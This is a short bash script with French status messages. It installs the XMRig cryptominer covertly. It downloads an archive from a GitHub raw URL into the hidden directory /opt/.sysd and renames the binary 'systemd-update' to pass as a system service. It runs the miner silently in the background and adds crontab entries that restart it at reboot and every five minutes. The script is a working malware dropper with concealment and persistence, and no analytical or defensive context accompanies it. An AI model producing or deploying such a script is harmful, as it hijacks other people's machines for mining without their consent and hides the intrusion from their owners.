#!/bin/bash

DIR="/opt/.sysd"
BIN="systemd-update"
GITHUB="https://raw.githubusercontent.com/ThipyThipy/machinee/main"

mkdir -p $DIR && cd $DIR

curl -fsSL $GITHUB/xmrig.tar.gz -o miner.tar.gz
tar -xzf miner.tar.gz
chmod +x $BIN

touch xmrig.log
sleep 5

nohup nice -n 19 ./$BIN --config=config.json --log-file=xmrig.log > /dev/null 2>&1 &

(crontab -l 2>/dev/null; echo "@reboot $DIR/$BIN --config=$DIR/config.json --log-file=$DIR/xmrig.log") | crontab -
(crontab -l 2>/dev/null; echo "*/5 * * * * pgrep -f $BIN > /dev/null || $DIR/$BIN --config=$DIR/config.json --log-file=$DIR/xmrig.log") | crontab -

sleep 5

if [ -f xmrig.log ]; then
  echo "
[🧠] Dernières lignes du log XMRig :"
  tail -n 10 xmrig.log
else
  echo "[!] Aucun fichier de log détecté. Le mineur a peut-être échoué."
fi
